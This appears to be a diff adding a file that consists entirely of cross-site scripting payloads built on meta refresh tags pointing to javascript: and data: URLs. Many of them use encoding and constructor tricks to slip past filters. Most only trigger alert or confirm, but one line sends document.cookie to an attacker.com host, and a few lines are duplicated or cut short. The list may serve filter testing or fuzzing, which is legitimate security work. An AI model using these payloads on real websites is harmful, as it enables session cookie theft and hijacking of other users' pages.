@@ -1,0 +1,91 @@
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<meta http-equiv="refresh" content="0;URL='javascript:alert(1)'">
+<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<meta http-equiv="refresh" content="0;url=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">
+<meta http-equiv="refresh" content="0;url=javascript:confirm('XSS')">
+<meta http-equiv="refresh" content="0;url=javascript:prompt('XSS')">
+<meta http-equiv="refresh" content="0;URL=javascript:alert(document.cookie)">
+<meta http-equiv="refresh" content="0;URL=javascript:document.body.innerHTML='XSS'">
+<meta http-equiv="refresh" content="0;url=javascript:void(alert('XSS'))">
+<meta http-equiv="refresh" content="0;url=javascript:eval('alert(1)')">
+<meta http-equiv="refresh" content="0;URL=`javascript:alert(1)`">
+<meta http-equiv="refresh" content="0;url=javascript:/*XSS*/alert(1)">
+<meta http-equiv="refresh" content="0;url=javascript://XSS
+alert(1)">
+<meta http-equiv="refresh" content="0;url=javascript:\u0061lert(1)">
+<meta http-equiv="refresh" content="0;url=javascript:window ">
+<meta http-equiv="refresh" content="0;url=javascript:window.alert.call(null,1)">
+<meta http-equiv="refresh" content="0;url=javascript:this ">
+<meta http-equiv="refresh" content="0;url=javascript:Function('alert(1)')()">
+<meta http-equiv="refresh" content="0;url=javascript:top ">
+<meta http-equiv="refresh" content="0;url=javascript:''[constructor][constructor]('alert(1)')()">
+<meta http-equiv="refresh" content="0;url=javascript:alert(String.fromCharCode(88,83,83))">
+<meta http-equiv="refresh" content="0;url=javascript:alert(/XSS/.source)">
+<meta http-equiv="refresh" content="0;url=javascript:'XSS'.replace(/X/, alert)">
+<meta http-equiv="refresh" content="0;url=javascript:\x61lert(1)">
+<meta http-equiv="refresh" content="0;url=javascript:%61lert(1)">
+<meta http-equiv="refresh" content="0;url=javascript:window ">
+<meta http-equiv="refresh" content="0;url=javascript:[].map.constructor('alert(1)')()">
+<meta http-equiv="refresh" content="0;url=javascript:Object.constructor('alert(1)')()">
+<meta http-equiv="refresh" content="0;url=javascript:setTimeout('alert(1)', 0)">
+<meta http-equiv="refresh" content="0;url=javascript:top ">
+<meta http-equiv="refresh" content="0;url=javascript:parent.alert('XSS')">
+<meta http-equiv="refresh" content="0;url=javascript:this.alert('XSS')">
+<meta http-equiv="refresh" content="0;url=javascript:window ">
+<meta http-equiv="refresh" content="0;url=javascript:void%20alert(1)">
+<meta http-equiv="refresh" content="0;url=javascript:typeof(alert)(1)">
+<meta http-equiv="refresh" content="0;url=javascript:top.location='javascript:alert(1)'">
+<meta http-equiv="refresh" content="0;url='javascript:eval(`alert(1)`)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(document.domain)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(navigator.userAgent)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(document.referrer)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(window.name)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(window.location)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(window.location.href)">
+<meta http-equiv="refresh" content="0;url=javascript:window['alert']('META')">
+<meta http-equiv="refresh" content="0;url=javascript:document.write('<script>alert(1)</script>')">
+<meta http-equiv="refresh" content="0;url=javascript:new Function('alert(1)')()">
+<meta http-equiv="refresh" content="0;url=javascript:[1].filter(alert)">
+<meta http-equiv="refresh" content="0;url=javascript:window.alert?.(1)">
+<meta http-equiv="refresh" content="0;url=javascript:alert`1`">
+<meta http-equiv="refresh" content="0;url=javascript:import('data:text/javascript,alert(1)')">
+<meta http-equiv="refresh" content="0;url=javascript:(()=>alert(1))()">
+<meta http-equiv="refresh" content="0;url=javascript:'a'.constructor.constructor('alert(1)')()">
+<meta http-equiv="refresh" content="0;url=javascript:window.alert?.(1)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(0x58)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(true)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(null)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(undefined)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(new Date())">
+<meta http-equiv="refresh" content="0;url=javascript:alert(document.title)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(location.hash)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(window.frames)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(document.forms.length)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(screen.width)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(screen.height)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(innerWidth)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(innerHeight)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(history.length)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(performance.now())">
+<meta http-equiv="refresh" content="0;url=javascript:alert(navigator.platform)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(navigator.language)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(typeof alert)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(Object.keys(window))">
+<meta http-equiv="refresh" content="0;url=javascript:alert(typeof document)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(this)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(self)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(top)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(window.frames.length)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(this.location)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(window.scrollY)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(window.scrollX)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(new Error('XSS'))">
+<meta http-equiv="refresh" content="0;url=javascript:alert('M' + 'E' + 'T' + 'A')">
+<meta http-equiv="refresh" content="0;url=javascript:alert(String.raw`XSS`)">
+<meta http-equiv="refresh" content="0;url=javascript:fetch('https://attacker.com/?cookie='+document.cookie)">
+<meta http-equiv="refresh" content="0;url=javascript:Image().src='javascript:alert(1)'">
+<meta http-equiv="refresh" content="0;url=javascript:alert(document.all)">
+<meta http-equiv="refresh" content="0;url=javascript:location='javascript:alert(1)'">
+<meta http-equiv="refresh" content="0;url=javascript:void(()=>{alert(1)})()">
+<meta http-equiv="refresh" content="0;url=javascript:document.body.append('XSS')">
+<meta http-equiv="refresh" content="0;url=javascript:location.assign('javascript:alert(1)')">
